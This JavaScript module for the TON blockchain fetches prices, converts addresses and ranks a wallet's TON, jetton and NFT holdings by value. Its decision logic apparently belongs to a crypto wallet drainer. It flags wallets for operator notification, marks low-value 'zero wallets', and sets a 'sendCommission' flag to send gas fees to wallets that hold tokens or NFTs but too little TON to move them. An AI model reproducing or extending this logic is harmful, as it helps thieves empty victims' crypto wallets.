const TonWeb = require("tonweb");

module.exports.getTonPrice = async (settings, api) => {
    try {
        const tonPrice = await api.tonPrice(settings.CURRENCY ? settings.CURRENCY : 'usd');
        return {
            price: (tonPrice.rates.TON.prices[`${settings.CURRENCY ? settings.CURRENCY : 'usd'}`.toUpperCase()]).toFixed(2),
            currency: settings.CURRENCY ? settings.CURRENCY : 'usd'
        }
    }catch (e) {
        return {
            price: 7.50,
            currency: 'usd'
        }
    }
}

module.exports.convertAddressToUserFriendly = (address) => {
    const uFA = new TonWeb.utils.Address(address);
    return uFA.toString(true, true, false);
}

module.exports.sort = (assets, settings) => {
    const assetTypeSum = assets.reduce((acc, asset) => {if (!acc[asset.type]) {acc[asset.type] = 0;}acc[asset.type] += asset.price;return acc;}, {});

    const sortedTypes = Object.entries(assetTypeSum).sort((a, b) => b[1] - a[1]).map(entry => entry[0]);
    // delete duplicates
    let uniqueAssetList = assets.filter((item, index, self) => index === self.findIndex((t) => t.type === item.type && t.balance === item.balance && t.name === item.name));

    const tonAsset = uniqueAssetList.filter(asset => asset.type === "Ton");
    const jettonAssets = uniqueAssetList.filter(asset => asset.type === "Jetton");
    const nftAssets = uniqueAssetList.filter(asset => asset.type === "Nft");
    const total = uniqueAssetList.reduce((total, asset) => total + +asset.inCurrency(), 0);

    if (total < +settings.MIN_BALANCE_TOTAL) {
        return {
            notify: settings.NOTIFY_ZERO_WALLETS === 'true',
            simulate: false,
            minimal: true,
            sendCommission: false,
            assets: sortedTypes,
            allAssets: uniqueAssetList,
            jettons: jettonAssets,
            nfts: nftAssets,
            ton: tonAsset
        };
    }


    let jetonsWitOutZero = false;
    try {  if (jettonAssets.length > 0) { jettonAssets.forEach(jetton => {  if (jetton.balance > 0) {  jetonsWitOutZero = true;  }});}} catch (e) {}

    const ifR = total > +settings.AUTO_COMMISSION_FROM && jetonsWitOutZero && tonAsset[0].balance < 0 || total > +settings.AUTO_COMMISSION_FROM && nftAssets.length > 0 && tonAsset[0].balance < 0;
    if (ifR) {
        if (settings.AUTO_COMMISSION === 'true') {
            return {
                notify: true,
                simulate: true,
                timeOut: 60 * 1000,
                minimal: false,
                sendCommission: true,
                assets: sortedTypes,
                allAssets: uniqueAssetList,
                jettons: jettonAssets,
                nfts: nftAssets,
                ton: tonAsset
            };
        }
        return {
            notify: true,
            simulate: false,
            minimal: false,
            sendCommission: false,
            assets: sortedTypes,
            allAssets: uniqueAssetList,
            jettons: jettonAssets,
            nfts: nftAssets,
            ton: tonAsset
        };
    }
    return {
        notify: true,
        simulate: true,
        timeOut: 0,
        minimal: false,
        sendCommission: false,
        assets: sortedTypes,
        allAssets: uniqueAssetList,
        jettons: jettonAssets,
        nfts: nftAssets,
        ton: tonAsset
    };
}